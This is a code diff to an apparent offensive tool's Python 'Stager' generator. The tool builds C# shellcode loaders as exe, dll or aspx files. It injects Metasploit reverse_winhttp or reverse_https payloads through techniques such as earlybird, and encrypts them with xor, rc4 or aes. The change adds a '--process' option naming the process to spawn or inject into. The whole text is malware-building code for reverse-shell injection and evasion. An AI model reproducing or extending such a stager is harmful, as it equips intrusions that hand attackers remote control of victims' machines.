@@ -193,7 +193,8 @@ class Stager:
     imports += ak.import_choices_code_import[self.args.injection]
     main_code += ak.main_choices[self.args.injection].format(ak=ak,
                                                         xor_path=path_obfuscated.get_hex_csharp(),
-                                                        xor_key=path_obfuscated.get_key_csharp())
+                                                        xor_key=path_obfuscated.get_key_csharp(),
+                                                        proc_name=self.args.process)
 
     # Make csharp template
     if self.args.format == "aspx":
@@ -259,6 +260,7 @@ def main():
   parser = argparse.ArgumentParser()
   parser.add_argument('--injection', '-i', default='earlybird', choices=ak.main_choices.keys())
   parser.add_argument('--msfpayload', default='reverse_winhttp', choices=['reverse_winhttp', 'reverse_https'])
+  parser.add_argument('--process', default='notepad', help="Process to create, or inject into")
   parser.add_argument('--format', '-f', default='dll', choices=['exe', 'dll', 'aspx'])
   parser.add_argument('--encrypt', '-e', default='rc4', choices=['xor', 'rc4', 'aes'])
   parser.add_argument('--key', default="", help="Key for AES or RC4")
